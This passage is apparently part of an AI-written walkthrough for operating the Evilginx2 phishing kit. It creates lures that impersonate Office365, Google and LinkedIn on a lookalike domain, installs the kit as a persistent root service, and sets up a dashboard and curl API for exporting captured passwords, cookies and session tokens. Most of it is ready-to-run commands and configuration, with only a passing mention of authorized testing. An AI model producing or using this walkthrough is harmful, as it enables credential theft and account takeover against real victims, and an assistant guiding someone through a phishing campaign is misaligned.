## Step 7.5: Create a Lure

A **lure** is a specific phishing URL. Each lure has a unique secret path so you can track different campaigns.

```
: lures create office365
```

**Expected output:**
```
lure_id: 0
tokens: ...
```

> **`lure_id: 0`** is the ID of your first lure. The **tokens** is a secret key embedded in the URL.

<br>

## Step 7.6: Modify the Lure (Optional)

You can set a specific redirect URL for this lure (overrides the global `unauth_url`):

```
: lures edit 0 redirect-url https://www.microsoft.com
```

After the victim logs in, they'll be redirected to Microsoft's real website (looks more realistic).

<br>

## Step 7.7: Get Your Phishing URL

```
: lures get-url 0
```

**Expected output:**
```
https://login.entreexampdremd.online/xxxxxx
```

> **This is YOUR phishing URL.** Copy it. Send it to your target (during an authorized test).

The `xxxxxx` part is the secret path — only people with this exact URL will see the phishing page. Everyone else gets redirected to Google.

<br>

## Step 7.8: Create Multiple Phishlets (Optional)

You can run multiple phishlets at the same time:

```
: phishlets hostname google entreexampdremd.online
: phishlets enable google
: lures create google
: lures get-url 0

: phishlets hostname linkedin entreexampdremd.online
: phishlets enable linkedin
: lures create linkedin
: lures get-url 0
```

Each phishlet uses a different subdomain defined in its YAML file.

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║     ███████  ██    ██ ███████ ████████ ███████ ███    ███                 ║
║    ██       ██    ██ ██         ██    ██      ████  ████                  ║
║    ███████  ██    ██ ███████    ██    █████   ██ ████ ██                  ║
║         ██  ██    ██      ██    ██    ██      ██  ██  ██                  ║
║    ███████   ██████  ███████    ██    ███████ ██      ██                  ║
║                                                                            ║
║               PHASE 8: SYSTEMD SERVICE (AUTO-START)                       ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 🔄 PHASE 8: Systemd Service (Auto-Start on Boot)

**Goal:** Set up Evilginx2 to start automatically when your server reboots and restart if it crashes.

> **Without this step:** If your server restarts (for updates, power outage, etc.), Evilginx2 stays off and you'll lose captures until you manually start it again.

<br>

## Step 8.1: Create the Service File

```bash
sudo nano /etc/systemd/system/evilginx.service
```

> **What this does:** Opens a text editor (nano) to create a new service file.

<br>

## Step 8.2: Paste the Service Configuration

Copy and paste this EXACTLY (right-click to paste in the terminal):

```ini
[Unit]
Description=Monsterz Evilginx2 with Autocert & Dashboard
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
Restart=always
RestartSec=5
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
```

> **⚠️ IMPORTANT:** Change `mypass1234` to the actual password you chose.

### What Each Section Does

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SYSTEMD SERVICE CONFIG EXPLAINED                         │
├──────────────────────────┬──────────────────────────────────────────────────┤
│        SETTING           │                     MEANING                      │
├──────────────────────────┼──────────────────────────────────────────────────┤
│  After=network.target    │ Start AFTER the network is ready                 │
│  Type=simple             │ It's a simple program (not a fork)               │
│  User=root               │ Run as root user (needed for port 53, 80, 443)  │
│  WorkingDirectory=...    │ Which folder to run from                         │
│  ExecStart=...           │ The actual command to run                        │
│  Restart=always          │ Restart if it crashes                            │
│  RestartSec=5            │ Wait 5 seconds before restarting                 │
│  LimitNOFILE=65535       │ Allow many open files (important for connections)│
│  WantedBy=multi-user.    │ Start on normal system boot                      │
│           target          │                                                  │
└──────────────────────────┴──────────────────────────────────────────────────┘
```

**To save in nano:** Press `Ctrl+X`, then `Y`, then `Enter`.

<br>

## Step 8.3: Enable and Start the Service

```bash
# Reload systemd so it knows about our new service
sudo systemctl daemon-reload

# Enable (auto-start on boot) AND start immediately
sudo systemctl enable --now evilginx

# Check if it's running
sudo systemctl status evilginx
```

**Expected output** (look for the green "active (running)"):
```
● evilginx.service - Monsterz Evilginx2 with Autocert & Dashboard
     Loaded: loaded (/etc/systemd/system/evilginx.service; enabled;)
     Active: active (running) since ...
```

<br>

## Step 8.4: View Logs

To see what Evilginx2 is doing in real-time:

```bash
sudo journalctl -u evilginx -f
```

> Press `Ctrl+C` to exit the log viewer. The `-f` flag means "follow" — it shows new log entries as they appear.

<br>

## Step 8.5: Service Management Commands

```bash
# Stop Evilginx2
sudo systemctl stop evilginx

# Start Evilginx2
sudo systemctl start evilginx

# Restart Evilginx2
sudo systemctl restart evilginx

# Check status
sudo systemctl status evilginx

# Disable auto-start (reverses the setup)
sudo systemctl disable evilginx
```

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║    ██    ██ ███████ ██████       ██████   █████  ███████  ██   ██         ║
║    ██    ██ ██      ██   ██     ██   ██ ██   ██ ██       ██   ██         ║
║    ██    ██ █████   ██████      ██████  ███████ ███████  ███████         ║
║     ██  ██  ██      ██   ██     ██   ██ ██   ██      ██  ██   ██         ║
║      ████   ███████ ██████      ██████  ██   ██ ███████  ██   ██         ║
║                                                                            ║
║                    PHASE 9: WEB DASHBOARD                                 ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 📊 PHASE 9: Web Dashboard

**Goal:** Access your captured sessions from any browser.

<br>

## Step 9.1: Access the Dashboard

Open your favorite browser and visit:

```
http://173.44.141.147:5000
```

Or if you set up the `admin` DNS record:

```
http://admin.entreexampdremd.online:5000
```

<br>

## Step 9.2: Login

Enter the credentials you set when starting Evilginx2:

- **Username:** `admin`
- **Password:** `mypass1234`

<br>

## Step 9.3: Dashboard Features

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DASHBOARD FEATURES — WHAT YOU CAN DO                     │
├──────────────────────────────────┬──────────────────────────────────────────┤
│           FEATURE                │              HOW TO USE IT               │
├──────────────────────────────────┼──────────────────────────────────────────┤
│  View all sessions               │ Main page — see every capture            │
│  Search by any field             │ Type in the search box (username, IP,    │
│                                  │ password, phishlet name)                 │
│  Filter by phishlet              │ Use the dropdown to show only one type   │
│  View session details            │ Click any row to see cookies and tokens  │
│  Export as CSV                   │ Download a spreadsheet-ready file        │
│  Export as JSON                  │ Download a machine-readable file         │
│  Delete a session                │ Click the delete button on any row       │
│  Auto-refresh                    │ Updates automatically every 5 seconds    │
│  Dark mode                       │ Toggle for comfortable nighttime viewing │
│  Pagination                      │ Navigate through many sessions           │
└──────────────────────────────────┴──────────────────────────────────────────┘
```

<br>

## Step 9.4: API Endpoints (For Advanced Users)

The dashboard also has a REST API for programmatic access:

```
┌─────────────────────────────────────┬────────┬─────────────────────────────────┐
│              ENDPOINT               │ METHOD │            PURPOSE              │
├─────────────────────────────────────┼────────┼─────────────────────────────────┤
│  /api/sessions                      │  GET   │ List all sessions               │
│  /api/sessions?search=admin         │  GET   │ Search for "admin"              │
│  /api/sessions?phishlet=office365   │  GET   │ Filter by phishlet              │
│  /api/sessions?limit=10&offset=0    │  GET   │ Pagination                      │
│  /api/sessions/export?format=csv    │  GET   │ Download as CSV                 │
│  /api/sessions/export?format=json   │  GET   │ Download as JSON                │
│  /api/sessions/{id}                 │  GET   │ Get one session                 │
│  /api/sessions/{id}                 │ DELETE │ Delete one session              │
└─────────────────────────────────────┴────────┴─────────────────────────────────┘
```

### API Examples

```bash
# List all sessions
curl -u admin:mypass1234 "http://173.44.141.147:5000/api/sessions"

# Search sessions
curl -u admin:mypass1234 "http://173.44.141.147:5000/api/sessions?search=admin"

# Export CSV
curl -u admin:mypass1234 "http://173.44.141.147:5000/api/sessions/export?format=csv" -o sessions.csv

# Delete session #1
curl -u admin:mypass1234 -X DELETE "http://173.44.141.147:5000/api/sessions/1"
```

<br>

---

<br>

Let me post this much now and continue with Phases 10-12 + cheat sheet + troubleshooting + architecture in the next response.
